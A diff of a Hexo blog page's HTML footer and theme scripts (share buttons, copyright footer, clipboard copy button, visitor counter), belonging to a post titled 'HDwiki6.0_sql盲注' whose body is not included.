+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&t=HDwiki6.0_sql盲注" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
 </div>
 
-        <footer class="footer">
-    <div class="top">
         
-<p>
-    <span id="busuanzi_container_site_uv" style='display:none'>
-        站点总访客数：<span id="busuanzi_value_site_uv"></span>
-    </span>
-    <span id="busuanzi_container_site_pv" style='display:none'>
-        站点总访问量：<span id="busuanzi_value_site_pv"></span>
-    </span>
-</p>
-
-
-        <p>
-            
-                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
-            
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
-        </p>
-    </div>
-    <div class="bottom">
-        <p><span>osword &copy; 2015 - 2020</span>
-            <span>
-                
-                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
-            </span>
-        </p>
-    </div>
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2020
+    osword
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
 </footer>
 
-    </main>
-    <div class="mask" id="mask"></div>
-<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 
-
-<div class="global-share" id="globalShare">
-    <ul class="reset share-icons">
-      <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&title=《HDwiki6.0_sql盲注》 — osword's blog&pic=http://zhzhdoai.github.io/img/avatar.jpg" data-title="微博">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      <li>
-        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&title=《HDwiki6.0_sql盲注》 — osword's blog&source=" data-title=" QQ">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/" data-title=" Facebook">
-          <i class="icon icon-facebook"></i>
-        </a>
-      </li>
-      <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《HDwiki6.0_sql盲注》 — osword's blog&url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&via=http://zhzhdoai.github.io" data-title=" Twitter">
-          <i class="icon icon-twitter"></i>
-        </a>
-      </li>
-      <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/" data-title=" Google+">
-          <i class="icon icon-google-plus"></i>
-        </a>
-      </li>
-    </ul>
- </div>
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
 
 
-<div class="page-modal wx-share" id="wxShare">
-    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/" alt="微信分享二维码">
-</div>
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
 
 
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
 
+<!-- clipboard -->
 
-    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
-<script>
-var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
 
-
-</script>
-
-<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
-
-
-<div class="search-panel" id="search-panel">
-    <ul class="search-result" id="search-result"></ul>
-</div>
-<template id="search-tpl">
-<li class="item">
-    <a href="{path}" class="waves-block waves-effect">
-        <div class="title ellipsis" title="{title}">{title}</div>
-        <div class="flex-row flex-middle">
-            <div class="tags ellipsis">
-                {tags}
-            </div>
-            <time class="flex-col time">{date}</time>
-        </div>
-    </a>
-</li>
-</template>
-
-<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
-
-
-
-
-
-
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-
-<script>
-(function() {
-    var OriginTitile = document.title, titleTime;
-    document.addEventListener('visibilitychange', function() {
-        if (document.hidden) {
-            document.title = '死鬼去哪里了！';
-            clearTimeout(titleTime);
-        } else {
-            document.title = '(つェ⊂)咦!又好了!';
-            titleTime = setTimeout(function() {
-                document.title = OriginTitile;
-            },2000);
-        }
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
     });
-})();
-</script>
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
 
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
 
 
 </body>
